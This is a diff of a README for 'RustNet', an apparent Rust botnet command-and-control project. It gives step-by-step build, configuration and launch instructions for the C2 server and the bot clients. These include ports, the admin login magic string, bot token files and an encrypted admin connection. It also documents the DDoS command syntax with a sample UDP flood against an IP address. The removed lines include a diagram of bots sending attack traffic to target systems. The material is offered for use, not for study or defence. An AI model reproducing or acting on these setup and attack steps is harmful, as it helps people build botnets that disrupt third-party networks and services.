@@ -1,126 +1,97 @@
+| Login | Dashboard |
+|-------|----------|
+| ![Login](https://github.com/user-attachments/assets/196e7a49-1244-4fc5-8e04-e6615a59eaa5) | ![Dashboard](https://github.com/user-attachments/assets/2a0c4b5b-2079-4116-8017-8ae07e0138d1) |
+
 ## Key Features
 
-This is a improvised and just a overall better overhaul of BotnetGoV2.
 
-*   **High-Performance Architecture**
-*   **End-to-End Encryption**: Enforces encryption for all communications, ensuring traffic opacity.
-*   **Cross-Platform Compatibility**: Native support for Linux (including WSL) and Windows environments.
-*   **Modular Design**: 
-*   **Advanced Management**:
-    *   Role-Based Access Control (RBAC) with hierarchical permissions (Owner, Admin, Ba   sic).
-    *   Real-time bot health monitoring and telemetry.
-    *   Persistent SQLite database for user management and audit logging.
+This is an improved and more polished version of **BotnetGoV2**, redesigned from the ground up to be cleaner, faster, and easier to work with.
 
-##  System Architecture
+* **High-Performance Architecture** built for speed and scale.  
+* **End-to-End Encryption** to keep all traffic secure and unreadable.  
+* **Cross-Platform Support** for Linux (including WSL) and Windows.  
+* **Modular System Design** so components stay easy to extend and maintain.  
+* **Advanced Management Tools**, including:
+  * Role-Based Access Control (Owner, Admin, Basic).
+  * Real-time bot status, health checks, and telemetry.
+  * SQLite-backed user accounts, roles, and audit logs.
 
-*   **OpenSSL**: Required for generating TLS certificates and establishing secure admin connections.
-    *   *Linux*: `sudo apt install openssl libssl-dev`
-    *   *Windows*: Install via vcpkg or Chocolatey.
+## System Overview
 
-### Server Configuration
+### OpenSSL Requirements
 
-The server acts as the central controller. It requires a configuration file and TLS certificates.
+OpenSSL is required for generating TLS certificates and enabling secure admin connections.
 
-1.  **Build the Server**:
-    ```bash
-    cd server
-    cargo build --release
-    ```
+**Linux:**  
+```bash
+sudo apt install openssl libssl-dev
+```
 
-2.  **TLS Certificate Generation**:
-    The server requires `cert.pem` and `key.pem` in the root directory. Generate self-signed certificates for secure communication:
-    ```bash
-    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem 
-     -days 365 -nodes -subj "/CN=RustNet Server"
-    ```
-    *Note: The server can auto-generate these if missing (when `strict_tls = false`), but manual generation is recommended for production.*
+**Windows:**  
+Install via **vcpkg** or **Chocolatey**.
 
-3.  **Configuration**:
-    Ensure `config/server.toml` exists. Default ports are `1420` (Admin) and `7002` (Bot).
-    ```toml
-    [server]
-    user_port = 1420
-    bot_port = 7002
-    enable_tls = true
-    login_magic_string = "loginforme"  # Critical for authentication
-    ```
+## Server Setup
 
-4.  **Launch**:
-    ```bash
-    ./target/release/rustnet-server
-    ```
+The server is the central controller. It needs a config file and TLS certificates before it can run.
 
-### 3. Client (Bot) Configuration
+### 1. Build the Server
+```bash
+cd server
+cargo build --release
+```
 
-The client connects to the server to execute commands.
+### 2. Generate TLS Certificates
+```bash
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem  -days 365 -nodes -subj "/CN=RustNet Server"
+```
 
-1.  **Build the Client**:
-    ```bash
-    cd client
-    cargo build --release
-    ```
+### 3. Configuration
+```toml
+[server]
+user_port = 1420
+bot_port = 7002
+enable_tls = true
+login_magic_string = "loginforme"
+```
 
-2.  **Configuration Files**:
-    Create the following files in the client's execution directory:
-    *   `c2_address.txt`: The Server IP and Bot Port (e.g., `127.0.0.1:7002`).
-    *   `bot_token.txt`: A unique authentication token.
-        *   *Generation*: Log into the server as Owner and run `regnode <arch>` to generate a valid token.
+### 4. Start the Server
+```bash
+./target/release/rustnet-server
+```
 
-3.  **Launch**:
-    ```bash
-    ./target/release/rustnet-client
-    ```
+## Client (Bot) Setup
 
+### 1. Build the Client
+```bash
+cd client
+cargo build --release
+```
 
-### Connecting to the Server
-Since the server enforces TLS, standard Telnet/Netcat clients will not work. You must use a TLS-capable client like OpenSSL.
+### 2. Required Files
+`c2_address.txt` and `bot_token.txt` should be placed beside the client executable.
 
-**Connection Command:**
+### 3. Start the Client
+```bash
+./target/release/rustnet-client
+```
+
+## Connecting to the Server
+
+Use OpenSSL:
 ```bash
 openssl s_client -connect localhost:1420 -quiet
 ```
 
-**Authentication Flow:**
-1.  **Handshake**: Upon connection, the server will display the banner.
-2.  **Magic String**: You must immediately type the configured magic string (Default: `loginforme`) and press Enter.
-3.  **Credentials**: Enter your Username and Password when prompted.
-
-
-#### Attack Execution
-
-**Syntax:**
-```text
+## Running an Attack
+```
 attack <method> <target_ip> <port> <duration>
 ```
 
-**Example:**
-```text
+Example:
+```
 attack UDP 192.168.1.50 80 60
 ```
 
-### Network Topology
-```mermaid
-graph TD
-    User[Admin/User] -- TLS/TCP (Port 1420) --> Server[C2 Server]
-    Server -- SQLite --> DB[(Database)]
-    
-    subgraph Botnet
-        Bot1[Bot Client 1]
-        Bot2[Bot Client 2]
-        Bot3[Bot Client N]
-    end
-    
-    Bot1 -- TLS/TCP (Port 7002) --> Server
-    Bot2 -- TLS/TCP (Port 7002) --> Server
-    Bot3 -- TLS/TCP (Port 7002) --> Server
-    
-    subgraph Target Infrastructure
-        Target[Target System]
-    end
-    
-    Bot1 -- Attack Traffic --> Target
-    Bot2 -- Attack Traffic --> Target
-    Bot3 -- Attack Traffic --> Target
-```
+## License
 
-This project is distributed under the MIT License. See the `LICENSE` file for details.
+MIT License. See `LICENSE`.
